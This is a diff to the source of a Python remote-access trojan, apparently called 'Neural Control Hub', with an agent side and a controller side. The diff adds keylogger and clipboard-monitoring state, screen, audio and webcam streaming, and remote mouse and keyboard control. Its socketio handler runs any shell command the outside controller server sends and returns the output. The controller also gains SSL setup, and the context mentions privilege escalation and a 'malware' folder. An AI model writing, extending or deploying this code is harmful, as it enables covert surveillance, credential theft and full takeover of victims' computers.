@@ -86,7 +86,39 @@ try:
 except ImportError:
     PYAUTOGUI_AVAILABLE = False
 
+import socketio
+
 SERVER_URL = "https://agent-controller.onrender.com"  # Change to your controller's URL
+
+# --- Agent State ---
+STREAMING_ENABLED = False
+STREAM_THREAD = None
+AUDIO_STREAMING_ENABLED = False
+AUDIO_STREAM_THREAD = None
+CAMERA_STREAMING_ENABLED = False
+CAMERA_STREAM_THREAD = None
+
+# --- Monitoring State ---
+KEYLOGGER_ENABLED = False
+KEYLOGGER_THREAD = None
+KEYLOG_BUFFER = []
+CLIPBOARD_MONITOR_ENABLED = False
+CLIPBOARD_MONITOR_THREAD = None
+CLIPBOARD_BUFFER = []
+LAST_CLIPBOARD_CONTENT = ""
+
+# --- Audio Config ---
+CHUNK = 1024
+FORMAT = pyaudio.paInt16
+CHANNELS = 1
+RATE = 44100
+
+# --- WebSocket Client with SSL ---
+sio = socketio.Client(
+    ssl_verify=True,
+    engineio_logger=False,
+    socketio_logger=False
+)
 
 # --- Privilege Escalation Functions ---
 
@@ -4460,7 +4492,11 @@ OPTIMIZED_DASHBOARD_HTML = """<!DOCTYPE html>
             if (webSocketStream) {
                 webSocketStream.close();
             }
-            webSocketStream = new WebSocket('ws://localhost:8765');
+            // Detect if we're using HTTPS and use appropriate WebSocket protocol
+            const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+            const host = window.location.hostname;
+            const port = window.location.port;
+            webSocketStream = new WebSocket(`${protocol}//${host}:8765`);
             
             webSocketStream.onmessage = function(event) {
                 try {
@@ -5253,8 +5289,8 @@ DASHBOARD_HTML = '''
 </html>
 '''
 
-def start_controller(host="0.0.0.0", port=8080):
-    """Start the controller server."""
+def start_controller(host="0.0.0.0", port=8080, use_ssl=True):
+    """Start the controller server with SSL support."""
     if not FLASK_AVAILABLE:
         print("Flask/SocketIO not available. Cannot start controller.")
         return False
@@ -5264,20 +5300,142 @@ def start_controller(host="0.0.0.0", port=8080):
     
     print(f"Starting Neural Control Hub on {host}:{port}")
     
+    # SSL Configuration
+    ssl_context = None
+    if use_ssl:
+        try:
+            import ssl
+            
+            # Generate self-signed certificate if needed
+            cert_file = "cert.pem"
+            key_file = "key.pem"
+            
+            if not os.path.exists(cert_file) or not os.path.exists(key_file):
+                print("Generating self-signed SSL certificate...")
+                generate_ssl_certificate(cert_file, key_file)
+            
+            ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+            ssl_context.load_cert_chain(cert_file, key_file)
+            
+            print("SSL enabled with self-signed certificate")
+            
+        except Exception as e:
+            print(f"SSL setup failed: {e}")
+            print("Running without SSL...")
+            ssl_context = None
+    
     try:
-        controller_socketio.run(
-            controller_app, 
-            host=host, 
-            port=port, 
-            debug=False,
-            # Remove SSL for now to avoid cert issues
-            # keyfile=r"C:\Users\Brylle\Documents\malware\key.pem", 
-            # certfile=r"C:\Users\Brylle\Documents\malware\cert.pem"
-        )
+        if ssl_context:
+            controller_socketio.run(
+                controller_app, 
+                host=host, 
+                port=port, 
+                debug=False,
+                ssl_context=ssl_context
+            )
+        else:
+            controller_socketio.run(
+                controller_app, 
+                host=host, 
+                port=port, 
+                debug=False
+            )
         return True
     except Exception as e:
         print(f"Failed to start controller: {e}")
         return False
+
+def generate_ssl_certificate(cert_file, key_file):
+    """Generate a self-signed SSL certificate."""
+    try:
+        from cryptography import x509
+        from cryptography.x509.oid import NameOID
+        from cryptography.hazmat.primitives import hashes
+        from cryptography.hazmat.primitives.asymmetric import rsa
+        from cryptography.hazmat.primitives import serialization
+        import datetime
+        
+        # Generate private key
+        private_key = rsa.generate_private_key(
+            public_exponent=65537,
+            key_size=2048,
+        )
+        
+        # Create certificate
+        subject = issuer = x509.Name([
+            x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
+            x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, "CA"),
+            x509.NameAttribute(NameOID.LOCALITY_NAME, "San Francisco"),
+            x509.NameAttribute(NameOID.ORGANIZATION_NAME, "Neural Control Hub"),
+            x509.NameAttribute(NameOID.COMMON_NAME, "localhost"),
+        ])
+        
+        cert = x509.CertificateBuilder().subject_name(
+            subject
+        ).issuer_name(
+            issuer
+        ).public_key(
+            private_key.public_key()
+        ).serial_number(
+            x509.random_serial_number()
+        ).not_valid_before(
+            datetime.datetime.utcnow()
+        ).not_valid_after(
+            datetime.datetime.utcnow() + datetime.timedelta(days=365)
+        ).add_extension(
+            x509.SubjectAlternativeName([
+                x509.DNSName("localhost"),
+                x509.IPAddress("127.0.0.1"),
+            ]),
+            critical=False,
+        ).sign(private_key, hashes.SHA256())
+        
+        # Write certificate
+        with open(cert_file, "wb") as f:
+            f.write(cert.public_bytes(serialization.Encoding.PEM))
+        
+        # Write private key
+        with open(key_file, "wb") as f:
+            f.write(private_key.private_bytes(
+                encoding=serialization.Encoding.PEM,
+                format=serialization.PrivateFormat.PKCS8,
+                encryption_algorithm=serialization.NoEncryption()
+            ))
+        
+        print(f"Generated SSL certificate: {cert_file} and {key_file}")
+        
+    except ImportError:
+        print("cryptography package not available. Using fallback method...")
+        generate_ssl_certificate_openssl(cert_file, key_file)
+    except Exception as e:
+        print(f"Failed to generate SSL certificate: {e}")
+        raise
+
+def generate_ssl_certificate_openssl(cert_file, key_file):
+    """Generate SSL certificate using OpenSSL command."""
+    try:
+        # Use OpenSSL command to generate certificate
+        cmd = [
+            "openssl", "req", "-x509", "-newkey", "rsa:2048", 
+            "-keyout", key_file, "-out", cert_file, 
+            "-days", "365", "-nodes", "-subj", 
+            "/C=US/ST=CA/L=San Francisco/O=Neural Control Hub/CN=localhost"
+        ]
+        
+        result = subprocess.run(cmd, capture_output=True, text=True)
+        if result.returncode == 0:
+            print(f"Generated SSL certificate using OpenSSL: {cert_file} and {key_file}")
+        else:
+            raise Exception(f"OpenSSL failed: {result.stderr}")
+            
+    except Exception as e:
+        print(f"OpenSSL certificate generation failed: {e}")
+        # Create dummy files to avoid errors
+        with open(cert_file, 'w') as f:
+            f.write("# Dummy certificate file\n")
+        with open(key_file, 'w') as f:
+            f.write("# Dummy key file\n")
+        raise
 
 # ========================================================================================
 # UNIFIED MAIN ENTRY POINT
@@ -5292,19 +5450,29 @@ def main_unified():
                        help='Run mode: agent, controller, or both')
     parser.add_argument('--host', default='0.0.0.0', help='Controller host (controller mode)')
     parser.add_argument('--port', type=int, default=8080, help='Controller port (controller mode)')
+    parser.add_argument('--no-ssl', action='store_true', help='Disable SSL for controller')
     
     args = parser.parse_args()
+    use_ssl = not args.no_ssl
     
     if args.mode == 'controller':
         print("Starting in Controller mode...")
-        start_controller(args.host, args.port)
+        if use_ssl:
+            print("SSL enabled - Controller will be available at https://{}:{}".format(args.host, args.port))
+        else:
+            print("SSL disabled - Controller will be available at http://{}:{}".format(args.host, args.port))
+        start_controller(args.host, args.port, use_ssl)
     elif args.mode == 'both':
         print("Starting in Both mode (Agent + Controller)...")
         # Start controller in a separate thread
         if FLASK_AVAILABLE:
+            if use_ssl:
+                print("SSL enabled - Controller will be available at https://{}:{}".format(args.host, args.port))
+            else:
+                print("SSL disabled - Controller will be available at http://{}:{}".format(args.host, args.port))
             controller_thread = threading.Thread(
                 target=start_controller, 
-                args=(args.host, args.port),
+                args=(args.host, args.port, use_ssl),
                 daemon=True
             )
             controller_thread.start()
@@ -5315,6 +5483,124 @@ def main_unified():
     else:
         print("Starting in Agent mode...")
         agent_main()
+
+# ========================================================================================
+# SOCKETIO EVENT HANDLERS FOR AGENT
+# ========================================================================================
+
+@sio.event
+def connect():
+    """Handle connection to server."""
+    print(f"Connected to server: {SERVER_URL}")
+    agent_id = get_or_create_agent_id()
+    sio.emit('agent_connect', {'agent_id': agent_id})
+
+@sio.event
+def disconnect():
+    """Handle disconnection from server."""
+    print("Disconnected from server")
+
+@sio.on('execute_command')
+def handle_execute_command(data):
+    """Handle command execution requests."""
+    agent_id = data.get('agent_id')
+    command = data.get('command', '')
+    
+    try:
+        if command.startswith('start-stream'):
+            start_streaming(agent_id)
+            output = "Screen streaming started"
+        elif command.startswith('stop-stream'):
+            stop_streaming()
+            output = "Screen streaming stopped"
+        elif command.startswith('start-audio'):
+            start_audio_streaming(agent_id)
+            output = "Audio streaming started"
+        elif command.startswith('stop-audio'):
+            stop_audio_streaming()
+            output = "Audio streaming stopped"
+        elif command.startswith('start-camera'):
+            start_camera_streaming(agent_id)
+            output = "Camera streaming started"
+        elif command.startswith('stop-camera'):
+            stop_camera_streaming()
+            output = "Camera streaming stopped"
+        else:
+            # Execute system command
+            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
+            output = result.stdout if result.stdout else result.stderr
+            if not output:
+                output = f"Command executed with return code: {result.returncode}"
+        
+        sio.emit('command_result', {'agent_id': agent_id, 'output': output})
+        
+    except Exception as e:
+        sio.emit('command_result', {'agent_id': agent_id, 'output': f"Error: {str(e)}"})
+
+@sio.on('mouse_move')
+def on_mouse_move(data):
+    """Handle simulated mouse movements."""
+    x = data.get('x')
+    y = data.get('y')
+    try:
+        if mouse_controller:
+            mouse_controller.position = (x, y)
+        elif low_latency_input:
+            low_latency_input.handle_input({
+                'action': 'mouse_move',
+                'data': {'x': x, 'y': y}
+            })
+    except Exception as e:
+        print(f"Error simulating mouse move: {e}")
+
+@sio.on('mouse_click')
+def on_mouse_click(data):
+    """Handle simulated mouse clicks."""
+    button = data.get('button')
+    event_type = data.get('event_type')
+
+    try:
+        if mouse_controller:
+            mouse_button = getattr(pynput.mouse.Button, button)
+            if event_type == 'down':
+                mouse_controller.press(mouse_button)
+            elif event_type == 'up':
+                mouse_controller.release(mouse_button)
+        elif low_latency_input:
+            low_latency_input.handle_input({
+                'action': 'mouse_click',
+                'data': {'button': button, 'pressed': event_type == 'down'}
+            })
+    except Exception as e:
+        print(f"Error simulating mouse click: {e}")
+
+@sio.on('key_press')
+def on_key_press(data):
+    """Handle simulated key presses."""
+    key = data.get('key')
+    event_type = data.get('event_type')
+
+    try:
+        if keyboard_controller:
+            if event_type == 'down':
+                if key in pynput.keyboard.Key.__members__:
+                    key_to_press = getattr(pynput.keyboard.Key, key)
+                    keyboard_controller.press(key_to_press)
+                else:
+                    keyboard_controller.press(key)
+            elif event_type == 'up':
+                if key in pynput.keyboard.Key.__members__:
+                    key_to_release = getattr(pynput.keyboard.Key, key)
+                    keyboard_controller.release(key_to_release)
+                else:
+                    keyboard_controller.release(key)
+        elif low_latency_input:
+            low_latency_input.handle_input({
+                'action': 'key_press',
+                'data': {'key': key}
+            })
+    except Exception as e:
+        print(f"Error simulating key press: {e}")
 
 def agent_main():
     """Main function for agent mode (original main functionality)."""
